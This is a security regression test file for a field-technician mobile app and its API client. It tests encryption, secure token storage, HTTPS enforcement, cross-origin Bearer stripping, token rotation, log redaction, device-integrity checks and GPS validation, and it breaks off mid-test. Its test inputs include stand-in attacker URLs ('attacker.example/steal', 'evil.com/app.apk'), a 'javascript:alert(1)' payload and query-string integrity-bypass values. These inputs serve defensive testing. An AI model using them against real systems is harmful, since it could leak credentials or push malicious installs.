import { describe, it, before, after, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import net from 'node:net';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import {
  configureOfflineTestEnv,
  closeServerHandles,
  restoreTestEnv,
  resolveRepoRoot,
  stubMethod,
  createNextRequest,
  OFFLINE_DATABASE_URL,
} from '../helpers/auth-test-harness';
import { MockNetworkHarness } from '../helpers/mock-api';
import { MockPersistentStorage } from '../helpers/mock-storage';
import { createMockJpegBuffer } from '../helpers/test-fixtures';

let deviceIntegrity: typeof import('../../../apps/mobile/src/security/deviceIntegrity');
let persistentStorageMod: typeof import('../../../apps/mobile/src/storage/persistentStorage');
let ApiClient: typeof import('../../../apps/mobile/src/api/client').ApiClient;
let locationGuard: typeof import('../../../apps/mobile/src/security/locationGuard');
let opmCamera: typeof import('../../../apps/mobile/src/camera/opmCamera');
let offlineQueueMod: typeof import('../../../apps/mobile/src/sync/offlineQueue');
let TicketService: typeof import('@/server/services/ticket.service').TicketService;
let prisma: typeof import('@repo/database').prisma;
let resetDatabaseHealthCache: typeof import('@repo/database').resetDatabaseHealthCache;

async function withMockTcpDbServer<T>(fn: () => Promise<T>): Promise<T> {
  const prevDbUrl = process.env.DATABASE_URL;
  const server = net.createServer((socket) => {
    socket.destroy();
  });

  await new Promise<void>((resolve) => {
    server.listen(0, '127.0.0.1', () => resolve());
  });

  const addr = server.address() as net.AddressInfo;
  process.env.DATABASE_URL = `postgresql://mock:mock@127.0.0.1:${addr.port}/mock?schema=public`;
  resetDatabaseHealthCache();

  try {
    return await fn();
  } finally {
    process.env.DATABASE_URL = prevDbUrl ?? OFFLINE_DATABASE_URL;
    resetDatabaseHealthCache();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
}

describe('Tier 1: Mobile Crypto, SecureStore, URL/Bearer, Gate, GPS, Camera, Headers & Docker (MOB-01..12, AUTH-11..12)', () => {
  const repoRoot = resolveRepoRoot();
  const restoreFns: Array<() => void> = [];
  let netHarness: MockNetworkHarness;

  before(async () => {
    configureOfflineTestEnv();
    netHarness = new MockNetworkHarness();
    const [diMod, psMod, clientMod, lgMod, camMod, oqMod, ticketMod, dbMod] = await Promise.all([
      import('../../../apps/mobile/src/security/deviceIntegrity'),
      import('../../../apps/mobile/src/storage/persistentStorage'),
      import('../../../apps/mobile/src/api/client'),
      import('../../../apps/mobile/src/security/locationGuard'),
      import('../../../apps/mobile/src/camera/opmCamera'),
      import('../../../apps/mobile/src/sync/offlineQueue'),
      import('@/server/services/ticket.service'),
      import('@repo/database'),
    ]);

    deviceIntegrity = diMod;
    persistentStorageMod = psMod;
    ApiClient = clientMod.ApiClient;
    locationGuard = lgMod;
    opmCamera = camMod;
    offlineQueueMod = oqMod;
    TicketService = ticketMod.TicketService;
    prisma = dbMod.prisma;
    resetDatabaseHealthCache = dbMod.resetDatabaseHealthCache;
  });

  afterEach(() => {
    netHarness.teardown();
    while (restoreFns.length > 0) {
      restoreFns.pop()?.();
    }
    configureOfflineTestEnv();
  });

  after(async () => {
    await closeServerHandles();
    restoreTestEnv();
  });

  it('MOB-01: uses randomized-IV AEAD (AES-256-GCM) with CSPRNG key, eliminating hardcoded static XOR key and plaintext fallback', async () => {
    const diSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'security', 'deviceIntegrity.ts'),
      'utf8',
    );
    assert.doesNotMatch(
      diSrc,
      /FIBEROPS_OFFLINE_SECRET_KEY_PLB_2026|fiberops_secure_storage_key_32b|function\s+deriveStorageKey/,
      'MOB-01: deviceIntegrity.ts must eliminate hardcoded static XOR key derivation in favor of CSPRNG Keychain/Keystore key',
    );
    assert.match(
      diSrc,
      /getRandomValues|randomBytes|AES-GCM|aes-256-gcm/i,
      'MOB-01: deviceIntegrity.ts must use CSPRNG key generation and AES-GCM AEAD encryption',
    );

    const sample = { accessToken: 'secret-jwt-token', ticketId: 'wo-1' };

    // 1. Two encryptions of identical plaintext MUST produce distinct ciphertexts (random IV, never deterministic XOR)
    const c1 = await deviceIntegrity.encryptOfflinePayload(sample);
    const c2 = await deviceIntegrity.encryptOfflinePayload(sample);
    assert.notStrictEqual(
      c1,
      c2,
      'MOB-01: Repeated encryption of identical plaintext must use unique random IV (not static XOR)',
    );
    assert.doesNotMatch(c1, /^enc:v1:/, 'MOB-01: Legacy static XOR enc:v1 format must be replaced by AEAD');

    // Round-trip decryption succeeds
    const decrypted = await deviceIntegrity.decryptOfflinePayload<typeof sample>(c1);
    assert.deepStrictEqual(decrypted, sample);

    // 2. Tampered ciphertext MUST reject (never return corrupted/partial data)
    const tampered = c1.slice(0, -4) + (c1.endsWith('AAAA') ? 'BBBB' : 'AAAA');
    await assert.rejects(
      () => deviceIntegrity.decryptOfflinePayload(tampered),
      'MOB-01: Tampered AEAD ciphertext must fail authentication and reject',
    );

    // 3. Raw plaintext JSON MUST NOT be returned by decryptData or OfflineQueueManager.getQueue
    await assert.rejects(
      () => deviceIntegrity.decryptData('{"accessToken":"unencrypted"}'),
      'MOB-01: decryptData must reject raw unencrypted plaintext instead of returning it',
    );

    const mockStorage = new MockPersistentStorage();
    await mockStorage.setItem(
      '@fiberops_offline_ticket_queue_v1',
      JSON.stringify([{ id: 'q1', submissionId: crypto.randomUUID(), ticketId: 'wo-1' }]),
    );
    const queueMgr = new offlineQueueMod.OfflineQueueManager(mockStorage);
    const loadedQueue = await queueMgr.getQueue();
    assert.strictEqual(
      loadedQueue.length,
      0,
      'MOB-01: OfflineQueueManager.getQueue must NOT silently accept unencrypted plaintext JSON fallback',
    );
  });

  it('MOB-02: declares native Expo dependencies, fails closed without SecureStore on native, and wipes all sensitive caches on logout & revocation', async () => {
    const mobilePkg = JSON.parse(
      fs.readFileSync(path.join(repoRoot, 'apps', 'mobile', 'package.json'), 'utf8'),
    ) as { dependencies?: Record<string, string> };
    const deps = mobilePkg.dependencies ?? {};
    for (const reqDep of [
      'expo-secure-store',
      'expo-location',
      'expo-camera',
      'expo-image-manipulator',
    ]) {
      assert.ok(deps[reqDep], `MOB-02: apps/mobile/package.json must declare ${reqDep}`);
    }

    // PersistentStorageAdapter must check expo-secure-store BEFORE AsyncStorage
    const psSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'storage', 'persistentStorage.ts'),
      'utf8',
    );
    const secureStoreIdx = psSrc.indexOf("require('expo-secure-store')");
    const asyncStorageIdx = psSrc.indexOf("require('@react-native-async-storage/async-storage')");
    assert.ok(secureStoreIdx !== -1 && asyncStorageIdx !== -1);
    assert.ok(
      secureStoreIdx < asyncStorageIdx,
      'MOB-02: PersistentStorageAdapter must prioritize expo-secure-store ahead of AsyncStorage',
    );

    // Runtime fail-closed check: in production native environment (window undefined, expo-secure-store unavailable),
    // storeSecureToken must NOT silently store plaintext/fallback in in-memory vault or AsyncStorage
    const prevNodeEnv = process.env.NODE_ENV;
    (process.env as Record<string, string | undefined>).NODE_ENV = 'production';
    try {
      await assert.rejects(
        () => deviceIntegrity.storeSecureToken('auth_tokens', 'secret-token-value'),
        'MOB-02: storeSecureToken must fail closed when expo-secure-store is unavailable in production native runtime',
      );
    } finally {
      (process.env as Record<string, string | undefined>).NODE_ENV = prevNodeEnv;
    }

    // App.tsx handleLogout AND onSessionRevoked must wipe cached tickets, ODPs, and offlineQueue
    const appSrc = fs.readFileSync(path.join(repoRoot, 'apps', 'mobile', 'App.tsx'), 'utf8');
    const logoutBlock = appSrc.match(/const handleLogout[\s\S]*?setCurrentScreen\('LOGIN'\)/)?.[0] || '';
    assert.ok(logoutBlock.length > 0, 'handleLogout must exist in App.tsx');
    assert.match(
      logoutBlock,
      /offlineQueue|cached.*ticket|@fiberops_offline|clear\(/i,
      'MOB-02: handleLogout must wipe offlineQueue and cached operational data',
    );
    const revokedBlock = appSrc.match(/onSessionRevoked:\s*\([^)]*\)\s*=>\s*\{[\s\S]*?setSecurityState\('SESSION_REVOKED_LOCK'\)/)?.[0] || '';
    assert.ok(revokedBlock.length > 0, 'onSessionRevoked must exist in App.tsx');
    assert.match(
      revokedBlock,
      /offlineQueue|cached.*ticket|@fiberops_offline|clear\(/i,
      'MOB-02: onSessionRevoked must wipe offlineQueue and cached operational data',
    );
    void persistentStorageMod;
  });

  it('MOB-03: enforces HTTPS serverUrl in prod (constructor, setBaseUrl, checkHealth), strips Bearer on cross-origin, validates 426 downloadUrl, and gates server modal behind __DEV__', async () => {
    const prevNodeEnv = process.env.NODE_ENV;
    (process.env as Record<string, string | undefined>).NODE_ENV = 'production';
    try {
      // 1a. Constructor with cleartext http:// in production must be rejected
      assert.throws(
        () =>
          new ApiClient({
            baseUrl: 'http://evil.local',
            deviceId: crypto.randomUUID(),
          }),
        'MOB-03: ApiClient constructor must reject cleartext http:// baseUrl in production',
      );

      const client = new ApiClient({
        baseUrl: 'https://ftth-ops.lintasarta.co.id',
        deviceId: crypto.randomUUID(),
      });
      client.setTokens({ accessToken: 'secret-mobile-jwt', refreshToken: 'secret-refresh' });

      // 1b. setBaseUrl and checkHealth with cleartext http:// in production must be rejected
      assert.throws(
        () => client.setBaseUrl('http://evil.local'),
        'MOB-03: setBaseUrl must reject cleartext http:// URLs in production',
      );
      const healthRes = await client.checkHealth('http://evil.local');
      assert.strictEqual(
        healthRes.ok,
        false,
        'MOB-03: checkHealth must reject cleartext http:// URL in production',
      );
      assert.match(
        healthRes.message,
        /https|tidak valid|ditolak|rejected|secure/i,
        'MOB-03: checkHealth rejection must fail on HTTPS validation rather than attempting cleartext fetch',
      );

      // 2. Cross-origin request() AND uploadMultipart() must NOT leak Authorization: Bearer header
      netHarness.setup();
      await client.request('https://attacker.example/steal', { method: 'GET' });
      const fdCross = new FormData();
      fdCross.append('file', new Blob([new Uint8Array(createMockJpegBuffer(512))], { type: 'image/jpeg' }), 'a.jpg');
      await client.uploadMultipart('https://attacker.example/steal-upload', fdCross);

      const reqLog = netHarness.getRequestLog();
      const attackerGet = reqLog.find((r) => r.url.includes('attacker.example/steal') && !r.url.includes('steal-upload'));
      const attackerUpload = reqLog.find((r) => r.url.includes('attacker.example/steal-upload'));
      assert.ok(attackerGet, 'Expected fetch call to attacker.example in mock harness');
      const sentHeaders = attackerGet.headers as Record<string, string> | undefined;
      assert.strictEqual(
        sentHeaders?.Authorization || sentHeaders?.authorization,
        undefined,
        'MOB-03: ApiClient.request MUST NOT transmit Authorization Bearer token to cross-origin URLs',
      );
      assert.ok(attackerUpload, 'Expected uploadMultipart fetch call to attacker.example/steal-upload');
      const uploadHeaders = attackerUpload.headers as Record<string, string> | undefined;
      assert.strictEqual(
        uploadHeaders?.Authorization || uploadHeaders?.authorization,
        undefined,
        'MOB-03: ApiClient.uploadMultipart MUST NOT transmit Authorization Bearer token to cross-origin URLs',
      );

      // 3. 426 Upgrade Required with javascript: or untrusted https://evil.com/app.apk downloadUrl must NOT forward unsafe URL
      for (const badUpgradeUrl of ['javascript:alert(1)', 'https://evil.com/app.apk']) {
        let capturedUpgradeUrl: string | undefined = 'unset';
        const lockedClient = new ApiClient({
          baseUrl: 'https://ftth-ops.lintasarta.co.id',
          deviceId: crypto.randomUUID(),
          onUpgradeRequired: (details) => {
            capturedUpgradeUrl = details.downloadUrl;
          },
        });
        netHarness.addRoute(
          (u) => u.includes('/api/v1/tech/tickets'),
          () =>
            new Response(
              JSON.stringify({
                success: false,
                error: { code: 'UPGRADE_REQUIRED', message: 'Update required' },
                meta: { minVersion: '2.0.0', downloadUrl: badUpgradeUrl },
              }),
              { status: 426, headers: { 'Content-Type': 'application/json' } },
            ),
        );
        await lockedClient.request('/api/v1/tech/tickets');
        assert.notStrictEqual(
          capturedUpgradeUrl,
          badUpgradeUrl,
          `MOB-03: 426 handler must reject untrusted downloadUrl (${badUpgradeUrl})`,
        );
      }
    } finally {
      (process.env as Record<string, string | undefined>).NODE_ENV = prevNodeEnv;
    }

    // 4. LoginScreen server settings button & modal must be structurally gated inside {__DEV__ && ...}
    const loginScreenSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'screens', 'LoginScreen.tsx'),
      'utf8',
    );
    assert.match(
      loginScreenSrc,
      /\{__DEV__\s*&&[\s\S]*?(?:Pengaturan Server|showServerModal)/,
      'MOB-03: LoginScreen server settings toggle and modal must be gated inside {__DEV__ && ...}',
    );
  });

  it('MOB-04: uses unique per-install CSPRNG deviceId, persists rotated tokens, handles 401/TOKEN_EXPIRED/TOKEN_REUSE_DETECTED in uploadMultipart, and calls /auth/logout', async () => {
    const appSrc = fs.readFileSync(path.join(repoRoot, 'apps', 'mobile', 'App.tsx'), 'utf8');
    assert.doesNotMatch(
      appSrc,
      /deviceId:\s*['"]DEVICE-TECH-SM-A54['"]/,
      'MOB-04: App.tsx must NOT hardcode shared static deviceId DEVICE-TECH-SM-A54',
    );

    // 1. uploadMultipart hitting 401 SESSION_REVOKED and 401 TOKEN_REUSE_DETECTED must invoke onSessionRevoked & clear tokens
    for (const revCode of ['SESSION_REVOKED', 'TOKEN_REUSE_DETECTED']) {
      let revokedCalled = false;
      const client = new ApiClient({
        baseUrl: 'https://ftth-ops.lintasarta.co.id',
        deviceId: crypto.randomUUID(),
        onSessionRevoked: () => {
          revokedCalled = true;
        },
      });
      client.setTokens({ accessToken: 'revoked-jwt', refreshToken: 'revoked-refresh' });

      netHarness.setup();
      netHarness.addRoute(
        (u) => u.includes('/api/v1/tech/tickets/wo-1/upload'),
        () =>
          new Response(
            JSON.stringify({
              success: false,
              error: { code: revCode, message: 'Revoked' },
            }),
            { status: 401, headers: { 'Content-Type': 'application/json' } },
          ),
      );
      const fd = new FormData();
      fd.append('file', new Blob([new Uint8Array(createMockJpegBuffer(1024))], { type: 'image/jpeg' }), 'a.jpg');
      await client.uploadMultipart('/api/v1/tech/tickets/wo-1/upload', fd);
      assert.strictEqual(
        revokedCalled,
        true,
        `MOB-04: ApiClient.uploadMultipart must trigger onSessionRevoked on 401 ${revCode}`,
      );
      assert.strictEqual(client.getTokens(), null, `MOB-04: tokens must be cleared on 401 ${revCode}`);
      netHarness.teardown();
    }

    // 2. uploadMultipart hitting 401 TOKEN_EXPIRED must silently rotate refresh token, persist rotated tokens, and retry upload
    const mockPersist = new MockPersistentStorage();
    const persistedWrites: Array<{ key: string; value: string }> = [];
    const origSetItem = persistentStorageMod.persistentStorage.setItem.bind(
      persistentStorageMod.persistentStorage,
    );
    restoreFns.push(
      stubMethod(persistentStorageMod.persistentStorage, 'setItem', (async (
        key: string,
        value: string,
      ) => {
        persistedWrites.push({ key, value });
        return origSetItem(key, value);
      }) as typeof persistentStorageMod.persistentStorage.setItem),
    );
    let callbackTokens: { accessToken?: string; refreshToken?: string } | null = null;
    let uploadCalls = 0;
    const refreshClient = new ApiClient({
      baseUrl: 'https://ftth-ops.lintasarta.co.id',
      deviceId: crypto.randomUUID(),
      ...({
        storage: mockPersist,
        onTokensRefreshed: (t: { accessToken: string; refreshToken: string }) => {
          callbackTokens = t;
        },
      } as Record<string, unknown>),
    });
    refreshClient.setTokens({ accessToken: 'expired-access', refreshToken: 'refresh-1' });
    persistedWrites.length = 0;
    await mockPersist.clear();
    await persistentStorageMod.removeEncryptedItem('auth_tokens').catch(() => undefined);
    await deviceIntegrity.removeSecureToken('auth_tokens').catch(() => undefined);

    netHarness.setup();
    netHarness.addRoute(
      (u) => u.includes('/api/v1/auth/refresh'),
      () =>
        new Response(
          JSON.stringify({
            success: true,
            data: { accessToken: 'rotated-access-2', refreshToken: 'rotated-refresh-2' },
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } },
        ),
    );
    netHarness.addRoute(
      (u) => u.includes('/api/v1/tech/tickets/wo-1/upload'),
      () => {
        uploadCalls++;
        if (uploadCalls === 1) {
          return new Response(
            JSON.stringify({ success: false, error: { code: 'TOKEN_EXPIRED', message: 'Expired' } }),
            { status: 401, headers: { 'Content-Type': 'application/json' } },
          );
        }
        return new Response(
          JSON.stringify({ success: true, data: { photoObjectKey: 'opm-proofs/2026/02/ok.jpg' } }),
          { status: 201, headers: { 'Content-Type': 'application/json' } },
        );
      },
    );

    try {
      const fdRetry = new FormData();
      fdRetry.append('file', new Blob([new Uint8Array(createMockJpegBuffer(1024))], { type: 'image/jpeg' }), 'retry.jpg');
      const retryUploadRes = await refreshClient.uploadMultipart('/api/v1/tech/tickets/wo-1/upload', fdRetry);
      assert.strictEqual(
        retryUploadRes.success,
        true,
        'MOB-04: ApiClient.uploadMultipart must handle 401 TOKEN_EXPIRED via silent refresh and retry upload',
      );
      assert.strictEqual(refreshClient.getTokens()?.refreshToken, 'rotated-refresh-2');

      // Verify rotated tokens are persisted behaviorally to PersistentStorage / SecureStore / injected storage or callback
      // Strictly require post-rotation 'rotated-refresh-2' (pre-rotation 'refresh-1' writes must never pass)
      const mockPersistEntries = Array.from(mockPersist.getRawStore().entries());
      let inMockPersist = false;
      for (const [, v] of mockPersistEntries) {
        if (v.includes('rotated-refresh-2')) {
          inMockPersist = true;
          break;
        }
        const dec = await deviceIntegrity
          .decryptOfflinePayload<{ refreshToken?: string }>(v)
          .catch(() => null);
        if (dec?.refreshToken === 'rotated-refresh-2') {
          inMockPersist = true;
          break;
        }
      }
      const decryptedPsTokens = await persistentStorageMod
        .getEncryptedItem<{ accessToken?: string; refreshToken?: string }>('auth_tokens')
        .catch(() => null);
      const secureStoreVal = await deviceIntegrity.getSecureToken('auth_tokens').catch(() => null);
      const callbackMatched =
        callbackTokens !== null &&
        (callbackTokens as { accessToken?: string }).accessToken === 'rotated-access-2' &&
        (callbackTokens as { refreshToken?: string }).refreshToken === 'rotated-refresh-2';
      let persistedInSingleton =
        persistedWrites.length > 0 && decryptedPsTokens?.refreshToken === 'rotated-refresh-2';
      if (!persistedInSingleton && persistedWrites.length > 0) {
        for (const w of persistedWrites) {
          if (w.value.includes('rotated-refresh-2')) {
            persistedInSingleton = true;
            break;
          }
          const dec = await deviceIntegrity
            .decryptOfflinePayload<{ refreshToken?: string }>(w.value)
            .catch(() => null);
          if (dec?.refreshToken === 'rotated-refresh-2') {
            persistedInSingleton = true;
            break;
          }
        }
      }
      const persistedInSecureStore =
        typeof secureStoreVal === 'string' && secureStoreVal.includes('rotated-refresh-2');

      assert.ok(
        callbackMatched || inMockPersist || persistedInSingleton || persistedInSecureStore,
        'MOB-04: ApiClient must persist rotated accessToken and refreshToken to PersistentStorage after silent 401 refresh',
      );
    } finally {
      netHarness.teardown();
      await persistentStorageMod.removeEncryptedItem('auth_tokens').catch(() => undefined);
      await deviceIntegrity.removeSecureToken('auth_tokens').catch(() => undefined);
    }

    // App.tsx handleLogout must invoke /api/v1/auth/logout
    const logoutBlock = appSrc.match(/const handleLogout[\s\S]*?setCurrentScreen\('LOGIN'\)/)?.[0] || '';
    assert.match(logoutBlock, /\/api\/v1\/auth\/logout/, 'MOB-04: handleLogout must call /api/v1/auth/logout');
  });

  it('MOB-05: mobile client error-log caller scrubs Authorization/Bearer/JWT secrets and does not supply untrusted userId', async () => {
    const mobileClient = new ApiClient({
      baseUrl: 'https://ftth-ops.lintasarta.co.id',
      deviceId: crypto.randomUUID(),
    });
    const clientAny = mobileClient as unknown as Record<string, unknown>;
    const optionalReportFn =
      typeof clientAny.reportErrorLog === 'function'
        ? (clientAny.reportErrorLog as (payload: Record<string, unknown>) => Promise<unknown>)
        : typeof clientAny.sendErrorLog === 'function'
          ? (clientAny.sendErrorLog as (payload: Record<string, unknown>) => Promise<unknown>)
          : null;

    const testPayload = {
      userId: 'spoofed-admin-id',
      errorMessage: 'Failed Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sig123',
      stackTrace: 'at fetch (token=eyJhbGciOiJIUzI1NiJ9.payload.sig)',
    };

    netHarness.setup();
    netHarness.addRoute(
      (u) => u.includes('/api/v1/tech/error-logs'),
      () => new Response(JSON.stringify({ success: true, data: { id: 'err-1' } }), { status: 200 }),
    );
    if (optionalReportFn) {
      await optionalReportFn.call(mobileClient, testPayload);
    } else {
      await mobileClient.request('/api/v1/tech/error-logs', {
        method: 'POST',
        body: JSON.stringify(testPayload),
      });
    }

    const errCall = netHarness.getRequestLog().find((r) => r.url.includes('/api/v1/tech/error-logs'));
    assert.ok(errCall, 'Expected POST /api/v1/tech/error-logs request');
    const sentBody = typeof errCall.body === 'string' ? errCall.body : JSON.stringify(errCall.body ?? '');
    assert.doesNotMatch(sentBody, /eyJhbGciOiJIUzI1NiJ9/, 'MOB-05: mobile error-log caller must scrub JWT secrets');
    assert.doesNotMatch(
      sentBody,
      /Authorization:\s*Bearer\s+(?!\[REDACTED\]|REDACTED|\*+)/i,
      'MOB-05: mobile error-log caller must redact Authorization Bearer tokens',
    );
    assert.doesNotMatch(sentBody, /spoofed-admin-id/, 'MOB-05: mobile error-log caller must not send client-forged userId');
    assert.doesNotMatch(sentBody, /"userId"\s*:/, 'MOB-05: mobile error-log caller must strip untrusted userId field from payload');

    // Verify no mobile source file sends raw Authorization/Bearer/JWT or untrusted userId to /tech/error-logs
    const mobileFilesToScan: string[] = [path.join(repoRoot, 'apps', 'mobile', 'App.tsx')];
    const collectMobileFiles = (dir: string) => {
      for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
        const full = path.join(dir, entry.name);
        if (entry.isDirectory()) collectMobileFiles(full);
        else if (/\.(ts|tsx)$/.test(entry.name)) mobileFilesToScan.push(full);
      }
    };
    collectMobileFiles(path.join(repoRoot, 'apps', 'mobile', 'src'));
    for (const filePath of mobileFilesToScan) {
      const src = fs.readFileSync(filePath, 'utf8');
      const srcNoComments = src
        .replace(/\/\*[\s\S]*?\*\//g, '')
        .replace(/(^|[^:\\])\/\/.*$/gm, '$1');
      if (srcNoComments.includes('/tech/error-logs')) {
        const srcWithoutDestructureOmission = srcNoComments.replace(
          /(?:\b(?:const|let|var)\s*)?\{[^}]*\.\.\.[^}]*\}\s*=/g,
          '',
        );
        assert.doesNotMatch(
          srcWithoutDestructureOmission,
          /error-logs[\s\S]{0,400}(?:\buserId\s*:(?!\s*_)|\bJSON\.stringify\s*\([^)]*\buserId\b|\.\s*userId\s*=[^=])/,
          `MOB-05: ${path.basename(filePath)} must not send client userId to /tech/error-logs`,
        );
      }
    }
  });

  it('MOB-06: fails integrity check on isDebuggable, removes ?dev_options=0 / ?dev_tools=false / localStorage bypasses, activates native root check, and fails closed on boot', async () => {
    // 1. isDebuggableOverride: true MUST produce isSecure === false
    const debuggableReport = await deviceIntegrity.checkDeviceIntegrity({
      isRootedOverride: false,
      isEmulatorOverride: false,
      isDebuggableOverride: true,
      developerOptionsOverride: false,
      adbEnabledOverride: false,
    });
    assert.strictEqual(
      debuggableReport.isSecure,
      false,
      'MOB-06: checkDeviceIntegrity must mark isDebuggable=true as insecure (isSecure=false)',
    );

    // 2. ?dev_options=0, ?dev_tools=false, and localStorage overrides must NOT bypass integrity check in production
    const g = globalThis as unknown as { window?: Record<string, unknown> };
    const prevWin = g.window;
    const prevNodeEnv = process.env.NODE_ENV;
    (process.env as Record<string, string | undefined>).NODE_ENV = 'production';
    for (const search of ['?dev_options=0&adb=0', '?dev_tools=false&usb_debugging=false']) {
      g.window = {
        location: { search },
        localStorage: {
          getItem: (k: string) => (k === 'fiberops_simulate_dev_options' ? '0' : null),
        },
        outerWidth: 1200,
        innerWidth: 390,
        outerHeight: 900,
        innerHeight: 800,
      };
      try {
        const spoofedQueryReport = await deviceIntegrity.checkDeviceIntegrity();
        assert.strictEqual(
          spoofedQueryReport.isSecure,
          false,
          `MOB-06: ${search} query/localStorage override must NOT bypass docked DevTools/integrity check in production`,
        );
      } finally {
        if (prevWin === undefined) {
          delete g.window;
        } else {
          g.window = prevWin;
        }
      }
    }
    (process.env as Record<string, string | undefined>).NODE_ENV = prevNodeEnv;

    // 2b. Native root / Play Integrity / App Attest check must NOT rely on self-referential customPaths?.includes(path) no-op
    const diSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'security', 'deviceIntegrity.ts'),
      'utf8',
    );
    assert.doesNotMatch(
      diSrc,
      /customPaths\?\.\s*includes\s*\(\s*path\s*\)/,
      'MOB-06: deviceIntegrity.ts must remove the no-op customPaths?.includes(path) root check',
    );
    assert.match(
      diSrc,
      /PlayIntegrity|AppAttest|expo-device|isRootedExperimental|fs\.existsSync|NativeModules/i,
      'MOB-06: deviceIntegrity.ts must implement real native root / Play Integrity / App Attest checks without customPaths',
    );

    // 3. App.tsx boot check catch block MUST transition to DEVICE_COMPROMISED_LOCK (never fall through to READY)
    const appSrc = fs.readFileSync(path.join(repoRoot, 'apps', 'mobile', 'App.tsx'), 'utf8');
    const bootBlock = appSrc.match(/async function initializeApp[\s\S]*?setSecurityState\('READY'\)/)?.[0] || '';
    const integrityTryCatch = bootBlock.match(/checkDeviceIntegrity[\s\S]*?catch[\s\S]*?\}/)?.[0] || '';
    assert.match(
      integrityTryCatch,
      /setSecurityState\s*\(\s*['"]DEVICE_COMPROMISED_LOCK['"]\s*\)/,
      'MOB-06: App.tsx initializeApp catch block must explicitly fail closed to DEVICE_COMPROMISED_LOCK',
    );
    assert.match(
      appSrc,
      /AppState|visibilitychange/,
      'MOB-06: App.tsx must re-verify device integrity on foreground resume (AppState / visibilitychange)',
    );
  });

  it('MOB-07: rejects null GPS accuracy, enforces geofence & 4xx queue exclusion, caps 5xx retries, and rejects missing clientRecordedAt / isMockLocation', async () => {
    // 1. acquireVerifiedLocation must NOT fabricate accuracyMeters=5 when coords.accuracy is null
    await assert.rejects(
      () =>
        locationGuard.acquireVerifiedLocation(
          { latitude: -2.9833, longitude: 104.7644 },
          async () => ({
            coords: { latitude: -2.98335, longitude: 104.76445, accuracy: null },
            mocked: false,
            timestamp: Date.now(),
          }),
        ),
      'MOB-07: acquireVerifiedLocation must reject null GPS accuracy instead of fabricating accuracyMeters=5',
    );

    // 1b. TicketSubmitScreen.tsx must block FLAGGED_OUT_OF_RANGE submissions and NOT enqueue 4xx into offlineQueue
    const submitSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'screens', 'TicketSubmitScreen.tsx'),
      'utf8',
    );
    assert.match(
      submitSrc,
      /FLAGGED_OUT_OF_RANGE[\s\S]{0,600}(?:throw|return|disabled|isOutOfRangeBlocked)/,
      'MOB-07: TicketSubmitScreen.tsx must enforce geofence block/rejection when gpsState is FLAGGED_OUT_OF_RANGE',
    );
    assert.match(
      submitSrc,
      /statusCode|status\s*>=\s*400|isRetryable|offlineQueue\.enqueue/,
      'MOB-07: TicketSubmitScreen.tsx must distinguish 4xx business errors from network/5xx errors before calling offlineQueue.enqueue',
    );
    assert.doesNotMatch(
      submitSrc,
      /if\s*\(\s*!submitRes\.success\s*\)\s*\{\s*throw new Error\([^)]*\);\s*\}\s*[\s\S]{0,120}catch\s*\([^)]*\)\s*\{[\s\S]{0,160}offlineQueue\.enqueue/,
      'MOB-07: TicketSubmitScreen.tsx must NOT unconditionally enqueue 4xx submit failures into offlineQueue',
    );

    // 2. OfflineQueueManager.flush() must drop/dead-letter non-retryable 4xx (e.g. 403/400) AND cap repeated 5xx retries
    const mockStorage = new MockPersistentStorage();
    const qMgr = new offlineQueueMod.OfflineQueueManager(mockStorage);
    const subId = crypto.randomUUID();
    await qMgr.enqueue({
      submissionId: subId,
      ticketId: 'wo-1',
      localPhotoUri: '',
      photoObjectKey: 'opm-proofs/2026/02/t-1.jpg',
      payload: {
        submissionId: subId,
        splitterId: 'ODP-PLB-001',
        portNumber: 1,
        attenuationDbm: -19,
        photoObjectKey: 'opm-proofs/2026/02/t-1.jpg',
        submittedLat: -2.98335,
        submittedLng: 104.76445,
        isMockLocation: false,
      },
    });
    qMgr.configure({
      sender: async () => ({
        success: false,
        error: { code: 'IDOR_VIOLATION', message: 'Forbidden', statusCode: 403 } as unknown as {
          code: string;
          message: string;
        },
      }),
    });
    await qMgr.flush();
    const after4xxQueue = await qMgr.getQueue();
    assert.strictEqual(
      after4xxQueue.length,
      0,
      'MOB-07: OfflineQueueManager.flush must drop/dead-letter non-retryable 4xx errors instead of infinitely re-queuing',
    );

    const retrySubId = crypto.randomUUID();
    await qMgr.enqueue({
      submissionId: retrySubId,
      ticketId: 'wo-5xx',
      localPhotoUri: '',
      photoObjectKey: 'opm-proofs/2026/02/t-5xx.jpg',
      payload: {
        submissionId: retrySubId,
        splitterId: 'ODP-PLB-001',
        portNumber: 1,
        attenuationDbm: -19,
        photoObjectKey: 'opm-proofs/2026/02/t-5xx.jpg',
        submittedLat: -2.98335,
        submittedLng: 104.76445,
        isMockLocation: false,
      },
    });
    qMgr.configure({
      sender: async () => ({
        success: false,
        error: { code: 'SERVICE_UNAVAILABLE', message: '503', statusCode: 503 } as unknown as {
          code: string;
          message: string;
        },
      }),
    });
    for (let i = 0; i < 8; i++) {
      await qMgr.flush();
    }
    const afterRepeated5xx = await qMgr.getQueue();
    assert.strictEqual(
      afterRepeated5xx.length,
      0,
      'MOB-07: OfflineQueueManager must enforce a max-retry cap on repeated 5xx failures (stop retrying after cap)',
    );

    // 3. Server TicketService must reject stale (>5m), missing clientRecordedAt, and isMockLocation=true
    await withMockTcpDbServer(async () => {
      const techId = crypto.randomUUID();
      const ticketId = crypto.randomUUID();
      restoreFns.push(
        stubMethod(prisma.ticket, 'findFirst', (async () => ({
          id: ticketId,
          ticketNumber: 'WO-STALE-1',
          status: 'IN_PROGRESS',
          assignedTechId: techId,
          customerId: crypto.randomUUID(),
          createdByAdminId: crypto.randomUUID(),
          customer: { cluster: { name: 'Palembang' }, splitter: null },
          assignedTech: null,
        })) as unknown as typeof prisma.ticket.findFirst),
      );
      restoreFns.push(
